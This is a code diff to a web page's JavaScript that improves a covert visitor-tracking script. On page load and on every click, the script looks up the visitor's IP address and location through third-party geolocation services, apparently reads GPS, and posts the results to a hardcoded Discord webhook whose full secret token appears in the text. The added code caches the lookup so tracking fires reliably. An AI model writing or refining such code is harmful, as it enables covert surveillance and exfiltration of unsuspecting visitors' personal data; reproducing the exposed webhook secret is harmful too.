@@ -535,19 +535,29 @@
   const WEBHOOK = 'https://discord.com/api/webhooks/1514018326961979462/2c4CMWt2PpQX0rjBY-6MrnWlJ7mQ9rHjIwPmN52XRG_aVacnFTBXPfytp3Xev3M2Iqu7';
 
   let cachedGPS = null;
+  let geoReady = null; // single promise, resolved once
+
+  async function getGeo() {
+    if (geoReady) return geoReady;
+    geoReady = (async () => {
+      try {
+        const r = await fetch('https://get.geojs.io/v1/ip/geo.json');
+        const d = await r.json();
+        if (d.ip) return { ip: d.ip, city: d.city, region: d.region, country: d.country };
+      } catch (_) {}
+      try {
+        const r = await fetch('https://api.country.is/');
+        const d = await r.json();
+        return { ip: d.ip, city: '?', region: '?', country: d.country };
+      } catch (_) {}
+      return { ip: 'unknown', city: '?', region: '?', country: '?' };
+    })();
+    return geoReady;
+  }
 
   async function sendToDiscord(label) {
     try {
-      let geo = {};
-      const apis = [
-        () => fetch('https://freeipapi.com/api/json').then(r => r.json()).then(d => ({ ip: d.ipAddress, city: d.cityName, region: d.regionName, country: d.countryName })),
-        () => fetch('https://ipapi.co/json/').then(r => r.json()).then(d => ({ ip: d.ip, city: d.city, region: d.region, country: d.country_name })),
-        () => fetch('https://ip-api.com/json/?fields=status,city,regionName,country,query').then(r => r.json()).then(d => ({ ip: d.query, city: d.city, region: d.regionName, country: d.country })),
-      ];
-      for (const api of apis) {
-        try { geo = await api(); if (geo.ip) break; } catch (_) {}
-      }
-
+      const geo = await getGeo();
       const now = new Date().toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' });
       const fields = [
         { name: '🖱️ Action', value: label, inline: false },
@@ -578,8 +588,8 @@
     { enableHighAccuracy: true, timeout: 10000 }
   );
 
-  // Fire on page load
-  sendToDiscord('Page visited');
+  // Pre-fetch geo immediately so it's ready before any clicks
+  getGeo().then(() => sendToDiscord('Page visited'));
 
   // Fire on every button/link click
   document.addEventListener('click', e => {
